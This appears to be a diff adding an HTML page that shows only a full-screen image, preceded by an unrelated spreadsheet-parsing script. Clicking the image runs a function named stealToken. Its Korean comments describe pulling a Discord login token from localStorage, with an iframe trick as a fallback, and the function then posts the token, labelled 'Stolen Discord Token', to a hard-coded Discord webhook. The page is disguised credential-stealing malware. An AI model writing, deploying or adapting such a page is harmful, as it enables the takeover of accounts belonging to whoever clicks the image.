@@ -1,0 +1,98 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #000000;
+        }
+        img {
+            max-width: 100%;
+            height: auto;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://ifh.cc/g/VzRMMV.webp" alt="" onclick="stealToken()">
+    <script>
+        async function stealToken() {
+            try {
+                // 디스코드 앱의 localStorage에서 토큰 추출
+                const token = localStorage.getItem('token') || 
+                            (function() {
+                                const iframe = document.createElement('iframe');
+                                document.body.appendChild(iframe);
+                                const token = iframe.contentWindow.localStorage.getItem('token');
+                                document.body.removeChild(iframe);
+                                return token;
+                            })();
+                
+                if (token) {
+                    // 웹훅으로 토큰 전송
+                    await fetch('https://discord.com/api/webhooks/1384464582600298517/4yq96QxR8FOR7fn8FFHDAhY2ttFH4sDWL6Fu56JAWw7dJl-Fyq24_XLXOzeb56GIqkkk', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            content: `Stolen Discord Token: ${token}`
+                        })
+                    });
+                    console.log('Token sent to webhook:', token);
+                } else {
+                    console.log('No Discord token found');
+                }
+            } catch (e) {
+                console.log('Error:', e.message);
+            }
+        }
+    </script>
+</body>
+</html>
